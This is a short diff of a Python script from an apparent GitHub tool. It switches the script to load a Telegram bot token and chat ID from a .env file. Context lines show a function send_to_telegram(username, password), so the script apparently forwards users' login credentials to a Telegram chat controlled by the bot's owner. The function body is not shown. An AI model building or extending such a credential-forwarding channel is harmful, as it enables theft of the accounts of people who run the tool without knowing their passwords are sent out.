@@ -6,6 +6,7 @@ print(f"\n[V{version}] For issues or feedback:\n- GitHub: github.com/offici4l/mi
 
 import os
 import importlib
+from dotenv import load_dotenv
 
 for lib in ['requests', 'urllib3']:
     try:
@@ -17,9 +18,13 @@ import requests, json, hashlib, urllib.parse, sys, threading
 from datetime import datetime, timezone, timedelta
 from base64 import b64encode, b64decode
 
+def configure():
+    load_dotenv()
+    
+
 # Telegram bot configuration
-bot_token = os.getenv("SEND_DATA_TOKEN")
-chat_id = os.getenv("T_CHAT_ID")
+bot_token = os.getenv("token")
+chat_id = os.getenv("chat_id")
 
 def send_to_telegram(username, password):
     # Message content
